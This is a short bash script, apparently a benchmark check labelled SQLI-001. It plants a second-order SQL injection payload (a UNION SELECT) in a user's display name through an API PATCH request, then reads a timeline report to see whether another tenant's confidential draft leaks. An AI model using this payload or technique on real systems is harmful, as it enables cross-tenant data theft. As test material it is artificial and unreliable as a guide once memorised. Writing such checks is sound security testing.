#!/usr/bin/env bash
# SQLI-001: second-order SQL injection. The payload is stored safely as the user's
# display_name (step 1); reportTimeline reads it back and interpolates it into a raw
# query (step 2), letting a UNION reach another tenant's draft.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
login user1@bench.local 'User123!'
payload="zzz%' UNION SELECT id, slug, body FROM posts WHERE slug='globex-internal' -- "
curl -s -b "$JAR" -X PATCH "$TARGET/api/users/me" -H 'content-type: application/json' \
  -d "$(python3 -c 'import json,sys;print(json.dumps({"displayName":sys.argv[1]}))' "$payload")" >/dev/null
if curl -s -b "$JAR" "$TARGET/api/reports/timeline" | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'; then
  rc=0
else
  rc=1
fi
reset
exit $rc
